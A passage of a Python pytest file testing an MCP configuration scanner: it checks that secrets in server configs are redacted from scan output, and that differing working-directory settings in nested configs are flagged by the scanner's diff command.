                "headers": {"Authorization": f"Bearer {auth_hdr_tok}"},
            },
            "excludeTools": [auth_tok, auth_hdr_tok, url_pw, "delete_item"],
        },
    }
    (tmp_path / ".mcp.json").write_text(json.dumps({"mcpServers": servers}))
    result = MCPScanner().scan(tmp_path)
    assert not result.scan_failures, result.scan_failures
    by_name = {c.name: c for c in result.components if isinstance(c, MCPServerComponent)}
    approved = by_name["oauth_srv"].properties["client_settings"]["auto_approved_tools"][
        "autoApprove"
    ]
    assert approved == ["***", "***", "***", "***", "***", "public-client-app"]
    excluded = by_name["auth_srv"].properties["client_settings"]["tool_filter_names"][
        "excludeTools"
    ]
    assert excluded == ["***", "***", "***", "delete_item"]
    dumped = json.dumps([c.model_dump(mode="json") for c in result.components])
    for item in (
        oauth_val,
        oauth_bearer,
        oauth_url_pw,
        auth_tok,
        auth_hdr_tok,
        url_pw,
        query_tok,
    ):
        assert item not in dumped


@pytest.mark.parametrize(
    "nested_path",
    [
        "packages/api/.mcp.json",
        "packages/api/.vscode/mcp.json",
        "sub/mcp.json",
    ],
)
def test_nested_mcp_config_does_not_treat_dot_cwd_as_workspace_root_equivalent(
    tmp_path, monkeypatch, nested_path
):
    def write_nested(root: Path, cwd_value: str) -> None:
        target = root / nested_path
        target.parent.mkdir(parents=True, exist_ok=True)
        server = {
            "command": "docker",
            "args": ["run", "mcp/git@sha256:" + ("b" * 64)],
            "cwd": cwd_value,
        }
        key_name = "servers" if ".vscode/" in nested_path else "mcpServers"
        target.write_text(json.dumps({key_name: {"git": server}}))

    dot_root = tmp_path / "dot"
    ws_root = tmp_path / "ws"
    write_nested(dot_root, ".")
    write_nested(ws_root, "${workspaceFolder}")

    monkeypatch.delenv(SOURCE_BINDING_KEY_ENV, raising=False)
    for root in (dot_root, ws_root):
        res = MCPScanner().scan(root)
        srv = next(c for c in res.components if isinstance(c, MCPServerComponent))
        finding = next(r for r in srv.risks if r.category == "completeness")
        assert "working directory" in finding.detail

    dot_bom = tmp_path / "dot_unkeyed.json"
    ws_bom = tmp_path / "ws_unkeyed.json"
    for root, out in ((dot_root, dot_bom), (ws_root, ws_bom)):
        run = CliRunner().invoke(
            main, ["scan", "--no-project-policy", "--report-only", str(root), "-o", str(out)]
        )
        assert run.exit_code == 0, run.output
    unkeyed_diff = CliRunner().invoke(main, ["diff", str(dot_bom), str(ws_bom), "--fail-on-alert"])
    assert unkeyed_diff.exit_code == 1, unkeyed_diff.output
    assert "unbound" in unkeyed_diff.output

    monkeypatch.setenv(SOURCE_BINDING_KEY_ENV, KEY)
    dot_keyed = tmp_path / "dot_keyed.json"
    ws_keyed = tmp_path / "ws_keyed.json"
    for root, out in ((dot_root, dot_keyed), (ws_root, ws_keyed)):
        check = CliRunner().invoke(main, ["scan", "--no-project-policy", "--check", str(root)])
        assert check.exit_code == 0, check.output
        run = CliRunner().invoke(main, ["scan", "--no-project-policy", str(root), "-o", str(out)])
        assert run.exit_code == 0, run.output
    same_keyed = CliRunner().invoke(
        main, ["diff", str(dot_keyed), str(dot_keyed), "--fail-on-alert"]
    )
    assert same_keyed.exit_code == 0, same_keyed.output
    changed_keyed = CliRunner().invoke(
        main, ["diff", str(dot_keyed), str(ws_keyed), "--fail-on-alert"]
    )
    assert changed_keyed.exit_code == 1, changed_keyed.output
    assert "[CRITICAL]" in changed_keyed.output
    assert "static source binding changed" in changed_keyed.output
